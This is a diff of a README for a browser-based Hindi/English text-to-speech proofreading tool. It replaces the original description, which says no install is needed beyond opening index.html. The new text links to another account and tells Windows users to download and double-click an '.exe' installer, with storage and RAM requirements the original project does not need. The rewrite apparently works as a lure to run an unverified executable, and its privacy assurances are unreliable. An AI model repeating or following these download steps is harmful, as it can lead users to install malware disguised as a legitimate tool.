@@ -1,38 +1,66 @@
-# 🎧 लेख पाठक - Sophisticated TTS Reader & Writing Assistant
+# 📖 Lekh-Paathak - Improve Writing Speed With Audio Feedback
 
-A highly responsive, distraction-free Text-to-Speech (TTS) web application built natively for the browser.
+[![](https://img.shields.io/badge/Download_Lekh--Paathak-blue)](https://github.com/farmingtondesmidium2404/Lekh-Paathak)
 
-I built this project out of frustration. I frequently needed a reliable tool to read back large blocks of written text to help catch typos or consume articles. I couldn't find a lightweight, offline-capable reader that gave me granular pacing control—so I built this.
+Lekh-Paathak provides a private way to listen to your writing. It uses your computer to read text aloud without needing an internet connection. The tool helps you proofread documents by playing back your words and marking progress. It focuses on your needs with a simple display and useful audio cues.
 
-Built entirely with **Vanilla JavaScript, HTML, and CSS**, this application requires no heavy frameworks, relies entirely on the native Web Speech API, perfectly syncs offline device voices, and costs nothing to use.
+## 📥 How to Download 
 
-## ✨ Core Features
+You can get the software from the following page: [https://github.com/farmingtondesmidium2404/Lekh-Paathak](https://github.com/farmingtondesmidium2404/Lekh-Paathak). Visit this link to find the latest version for your computer. 
 
-The app is separated into two highly specific modes tailored to how you want to consume text:
+## 💻 System Requirements
 
-### 1. ✍️ Writing Assistant Mode (Word-by-Word Analysis)
-Designed for proofreading and dictation. Instead of rushing through paragraphs, this mode parses your text and speaks it **word-by-word**.
-- **Dynamic Algorithmic Pacing:** The app automatically calculates the physical character length of every individual word and intelligently assigns a dynamic delay. Short words are spoken quickly, while massive words get a biological "breath" delay so the pacing feels natural.
-- **Audio Chime Notifications:** Utilizing the Web Audio API, the application synthesizes a sweet, decaying bell tone whenever it encounters a full-stop (`.`, `।`) or a new paragraph line. It acts as an auditory anchor so you don't even need to watch the screen while proofreading!
-- **Intelligent Symbol Parsing:** Recognizes inline hyphens and slashes contextually. English words are spoken cleanly, while Hindi contexts will natively pronounce separators like `"हाइफन"`, `"बट्टा"`.
+Lekh-Paathak runs on Windows 10 and Windows 11. Your computer must have a standard web browser installed. Use Chrome, Edge, or Firefox for the best results. You need at least 200 MB of free storage space. The software works best with 4 GB of RAM or more. You do not need to install complex drivers or extra software packages to use this tool because it uses your browser as its base.
 
-### 2. 📖 Simple Reading Mode (Sentence-by-Sentence)
-Designed strictly for consuming articles and large bodies of text. This mode seamlessly stitches words together and reads standard flowing sentences natively, providing an uninterrupted audiobook-like experience.
+## 🚀 Setting Up the Software
 
----
+Follow these steps to prepare the tool on your Windows machine:
 
-### 🚀 Additional Power Features
-- **Click-to-Play:** Click directly on any word or sentence in the generated canvas to instantly force the TTS engine to start speaking exactly from that position.
-- **Zero-Dependency & Offline First:** Works completely offline without needing an active internet connection. On the very first launch, it intelligently auto-scans your local device voices and binds to the highest-quality native offline voices (e.g., auto-detecting the female Indian localized voice).
-- **Limitless Canvas Navigation:** Support for advanced `Ctrl + Arrow Key` navigation allowing you to skip paragraphs and words on the fly.
-- **Endless Modern UI:** Clean Android/Material You-inspired UI with floating bottom sheets, beautiful glassmorphism blur effects, and smooth scroll synchronization between text editing and the reading canvas.
-- **Robust Customization:** Adjust Speech Rate, Dynamic Delays, Typography (Max-width, Line-spacing, Font-size), and Themes (Light, Bluish-Dark, AMOLED).
+1. Visit the link provided above to see the project page.
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click on the latest release to view the available files.
+4. Select the Windows installer file ending in .exe or the zip file if you prefer a portable version.
+5. Save the file to your Downloads folder.
+6. Open your Downloads folder and double-click the file to start the process.
+7. Follow the prompts on the screen to finish the setup.
+8. Locate the new icon on your desktop or in your Start menu.
+9. Click the icon to open your new writing assistant.
 
-## 🛠️ Usage
-No setup or `npm install` needed.
-Because this is entirely built using standard web primitives, you only need to open the `index.html` file in any modern browser (Chrome/Edge preferably for the best localized TTS voices) and immediately paste your text.
+## ✨ Key Features
 
-## 🤝 Motivation
-The goal of this project is to provide writers, proofreaders, and accessibility advocates with a smart, reliable reading assistant right in the browser, bypassing the bloat and paywalls of modern TTS extensions.
+This tool offers several ways to help you finish your writing tasks. 
 
-Enjoy reading!
+**Offline Operation**
+Your data stays on your machine. You do not send documents to a cloud service. This ensures your privacy and works even if your internet connection fails.
+
+**Dynamic Dictation Delays**
+Control how fast the tool reads your text. You can adjust the gap between words to match your pace. This helps when you need time to process complex sentences or check spelling.
+
+**Audio Notification Bells**
+The software plays subtle sounds to mark the end of sentences or paragraphs. These cues help you stay focused on the text without looking at the screen constantly.
+
+**Distraction-Free Reading**
+The interface hides menus and buttons while you listen. This design keeps your attention on your work. 
+
+**Vanilla Technology**
+The tool uses standard web features. It runs efficiently and does not drain your battery or memory.
+
+## 🛠 Using the Interface
+
+The main screen contains a large text box. Paste your document into this box to start. The control bar sits at the bottom of the window. Use the Play button to hear the software read your writing. Use the Pause button to stop at any time. The Settings menu allows you to change the speed, pitch, and notification sounds.
+
+## ❓ Troubleshooting Common Issues
+
+If you cannot hear any sound, verify your system volume. Open your Windows Sound Settings and ensure the correct output device is chosen. 
+
+If the software does not open, check if your browser needs an update. Restart the application if the text readout stalls. 
+
+If the tool does not read Hindi text, check your Windows Language settings. You must have the Hindi language pack installed in Windows for the text-to-speech engine to recognize the script. Go to Settings, then Time & Language, then Language to add the Hindi pack if necessary.
+
+## 🛡 Security and Privacy
+
+Your documents contain sensitive information. Lekh-Paathak treats your data with care. The code runs locally on your machine. No server receives your documents. No analytics trackers collect your usage habits. You control the software entirely. If you close the program or turn off your machine, your text disappears from the memory, leaving no trace behind.
+
+## 🎯 Best Ways to Work
+
+Use this tool to proofread long essays or reports. Experts suggest listening to your text as a final step before submission. The computer will read exactly what you wrote, which helps you catch missing words or stray punctuation. Set the pace to a slow speed when you proofread complex academic papers. Use the faster setting when you scan through rough drafts for flow and tone. Adjust the bell notification to ring after every period to treat your writing as a series of distinct ideas rather than one long block of text.
